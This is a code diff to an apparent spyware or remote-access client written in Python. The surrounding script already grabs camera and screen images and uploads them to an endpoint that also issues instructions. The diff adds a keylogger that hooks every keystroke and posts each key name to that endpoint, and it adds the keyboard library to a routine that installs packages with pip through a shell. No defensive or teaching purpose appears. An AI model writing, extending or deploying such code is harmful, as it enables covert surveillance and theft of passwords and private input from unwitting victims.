@@ -1,10 +1,20 @@
+import subprocess
+requiredLibraries = ["numpy", "pyautogui", "opencv-python", "keyboard"]
+
+def InstallLibraries():
+    for library in requiredLibraries:
+        try:
+            subprocess.run("pip install " + library, shell=True)
+        except Exception as err:
+            print("error while installing library " + library + ", error: " + err)
+
 import requests
 import time
-import subprocess
 import io
 import pyautogui
 import PIL
 import cv2
+import keyboard
 
 endPoint = "http://localhost:8080"
 
@@ -23,6 +33,21 @@ def GetCameraBytes():
     imgBytes.seek(0)
     return imgBytes
 
+def SendKeyPress(key):
+    requests.post(endPoint + "/keypress", key)
+
+def KeyPressed(eventArgs):
+    keyName = eventArgs.name
+    eventType = eventArgs.event_type
+    if eventType == "up":
+        SendKeyPress(keyName)
+
+def StartKeylogger():
+    keyboard.hook(KeyPressed)
+
+def StopKeylogger():
+    keyboard.unhook_all()
+
 def GetCamera():
     imgBytes = GetCameraBytes()
     if imgBytes:
@@ -40,16 +65,6 @@ def GetScreen():
     imgBytes = GetScreenBytes()
     fileData = {"file": ("screenshot.png", imgBytes, "image/png")}
     requests.post(endPoint + "/upload", files=fileData)
-
-
-requiredLibraries = ["numpy", "pyautogui", "opencv-python"]
-
-def InstallLibraries():
-    for library in requiredLibraries:
-        try:
-            subprocess.run("pip install " + library, shell=True)
-        except Exception as err:
-            print("error while installing library " + library + ", error: " + err)
 
 def GetInstructions():
     instructions = None
